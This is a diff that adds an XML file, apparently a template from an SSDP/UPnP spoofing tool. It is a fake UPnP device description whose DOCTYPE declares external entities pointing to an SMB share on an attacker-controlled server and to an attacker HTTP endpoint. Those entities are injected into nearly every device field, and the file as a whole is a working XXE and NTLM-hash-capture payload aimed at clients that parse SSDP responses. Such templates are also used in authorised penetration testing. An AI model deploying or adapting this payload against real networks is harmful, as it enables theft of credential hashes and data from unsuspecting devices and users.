@@ -1,0 +1,37 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ 
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file://///$smbServer/smb/hash.jpg" >
+<!ENTITY xxe-url SYSTEM "http://$localIp:$localPort/ssdp/xxe.html" >
+]>
+<hello>&xxe;&xxe-url;</hello>
+<root>
+    <specVersion>
+        <major>1</major>
+        <minor>0</minor>
+    </specVersion>
+    <device>
+        <deviceType>&xxe;</deviceType>
+        <friendlyName>&xxe;</friendlyName>
+        <manufacturer>&xxe;</manufacturer>
+        <manufacturerURL>&xxe;</manufacturerURL>
+        <modelDescription>&xxe;</modelDescription>
+        <modelName>&xxe;</modelName>
+        <modelNumber>&xxe;</modelNumber>
+        <modelURL>&xxe;</modelURL>
+        <serialNumber>&xxe;</serialNumber>
+        <UDN>uuid:e415ce0a-3e62-22d0-ad3f-42ec42e36563</UDN>
+        <serviceList>
+            <service>
+                <URLBase>http://$localIp:$localPort</URLBase>
+                <serviceType>&xxe;</serviceType>
+                <serviceId>&xxe;</serviceId>
+                <controlURL>&xxe;</controlURL>
+                <eventSubURL/>
+                <SCPDURL>&xxe;</SCPDURL>
+            </service>
+        </serviceList>
+        <presentationURL>http://$localIp:$localPort/present.html</presentationURL>
+        </device>
+    </root>
+
